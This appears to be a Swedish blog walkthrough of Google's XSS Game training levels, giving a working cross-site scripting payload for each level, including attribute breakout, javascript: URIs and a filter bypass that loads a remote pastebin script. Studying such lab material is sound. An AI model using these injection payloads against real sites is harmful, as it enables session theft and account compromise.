---
layout: post
title: XSS 2 - Google XSS Game
date: 2015-12-10 19:41:45.000000000 -03:00
type: post
published: true
status: publish
categories: []
tags: []
meta:
  _publicize_pending: '1'
  _rest_api_published: '1'
  _rest_api_client_id: "-1"
  _publicize_job_id: '17733873085'
  original_post_id: '669'
  _wp_old_slug: '669'
  _oembed_21ffeb15e29dc7ce5018bb4548df07f6: "{{unknown}}"
  _oembed_260f0137fb304ca68aa9f8c82229456d: "{{unknown}}"
  _oembed_0e54617f9f4c46dcf103242a0a644ff6: "{{unknown}}"
  _oembed_c9fff206773cb92fbc2a37cf5549e386: "{{unknown}}"
  _oembed_45e1c901310d75a550e5c79104ae65a5: "{{unknown}}"
  _oembed_863d9937421ee45fab04ade3274bba8d: "{{unknown}}"
  _oembed_4ad5cb82558423a337350f1cc738946b: "{{unknown}}"
  _oembed_36ebc6730eee5793797580bb5e878f5b: "{{unknown}}"
author:
  login: tidlost
  email: philip.linghammar@protonmail.com
  display_name: tidlost
  first_name: ''
  last_name: ''
---

https://xss-game.appspot.com/level5
### Level 1

Här är level 1: https://xss-game.appspot.com/level1
Ja här var det ju inga konstigheter. En uppvärmningsnivå.
I sökfältet kör man:

```javascript
<script>alert("xss");</script>
```

### Level 2

Som vi kan se i det första inlägget. Det första kommentaren, så går det alltså att posta html i kommentarerna. Men script verkar vara filtrerat.
Så istället injectar vi en funktion i bilden.

```javascript
<img src="#" onclick="alert(3);">
```

### Level 3
Nu har det blivit lite svårare.
Vi kan alltså notera att när man klickar på en flik så kallar vi på funktionen `onclick(chooseTab("3))`. Om vi sedan kollar i den funktionen så ser vi att den hämtar ett nummer från adressfältet, med hjälp av dom-objektet window.location.hash. Hash representerar är # som finns i adressen. Detta innebär att vi kan injecta javascript direkt i adressfältet. Det som skrivs i adressfältet skickas sedan till en bildadress för att visa upp rätt bild.
Därför behöver vi bara injecta följande:

```javascript
https://xss-game.appspot.com/level3/frame#2' onclick="alert(2)"
```

Efter `#2` så avslutar vi attributet med ett `'`. Sen lägger vi till vår egen kod.

### Level 4

Den här var mycket svårare än de tidigare.
Där behövde vi först avsluta tidigare kommando, men för att det skulle funka så behöver vi använda url-encoding. Dom finns här: http://www.w3schools.com/tags/ref_urlencode.asp

```javascript
https://xss-game.appspot.com/level4/frame/?timer=')%3Bonload="alert(3)"//
```

### Level 5
Så I den här leveln så lär mig sig att det finns ett annat sätt att injecta javascript. Det är att injecta det i länkadresser.

```javascript
<a href="javascript:alert(2)">länk</a>
```

Så det är principen för den här leveln.

```javascript
https://xss-game.appspot.com/level5/frame/signup?next=javascript:alert(2)
```

### Level 6

Den här nivån var lite svårare än de tidigare.
Här behöver man själv skapa en fil som ska executas. Så jag skapade filen i pastebin.
Det finns en regex som filterar ut http. Så att man inte kan skicka in externa skript. Men regexen är inte case-sensitive. Vilket gör att man helt enkelt bara kan skriva det med stora bokstäver.

```javascript
https://xss-game.appspot.com/level6/frame#hTTpS://pastebin.com/raw.php?i=xRxAiEVU
```
